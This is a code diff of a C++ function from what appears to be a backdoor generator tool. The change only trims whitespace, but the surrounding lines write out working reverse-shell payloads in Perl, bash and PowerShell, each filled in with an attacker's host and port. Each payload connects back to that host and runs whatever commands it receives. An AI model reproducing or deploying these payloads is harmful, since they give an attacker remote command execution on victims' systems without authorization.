@@ -1,10 +1,10 @@
 
 void scriptPayloads (char *backdoor, string lhost, string lport) {
- 
+
     char ext[5]; string output;
-    
+
     if (!strcmp(backdoor,"backdoors/unix/python/reverse_tcp")) {
-        
+
         strcpy(ext, ".py");
 
         output=
@@ -24,7 +24,7 @@ void scriptPayloads (char *backdoor, string lhost, string lport) {
     }
 
     else if (!strcmp(backdoor,"backdoors/unix/perl/reverse_tcp")) {
-       
+
         strcpy(ext, ".pl");
 
         output=     "perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"";
@@ -34,7 +34,7 @@ void scriptPayloads (char *backdoor, string lhost, string lport) {
         output+=    "\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'";
 
     }
-    
+
     else if (!strcmp(backdoor,"backdoors/unix/bash/reverse_tcp")) {
 
         strcpy(ext, ".sh");
@@ -45,9 +45,9 @@ void scriptPayloads (char *backdoor, string lhost, string lport) {
         output+=    lport;
         output+=    ";sh <&46 >&46 2>&46";
     }
-    
+
     else if (!strcmp(backdoor,"backdoors/unix/ruby/reverse_tcp")) {
-        
+
         strcpy(ext, ".rb");
 
         output =
@@ -152,9 +152,9 @@ void scriptPayloads (char *backdoor, string lhost, string lport) {
         output+=");$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
     }
 
-    else { 
-        red(); printf("Error!\n"); 
-        return; 
+    else {
+        red(); printf("Error!\n");
+        return;
     }
 
     char rn[30];
@@ -172,7 +172,7 @@ void scriptPayloads (char *backdoor, string lhost, string lport) {
 
     if ( path != NULL )
         green();
-    
+
         #ifdef nt
             cout << "\n\tExploit Location : " << path << "\\" << filename << "\n\n";
         #else
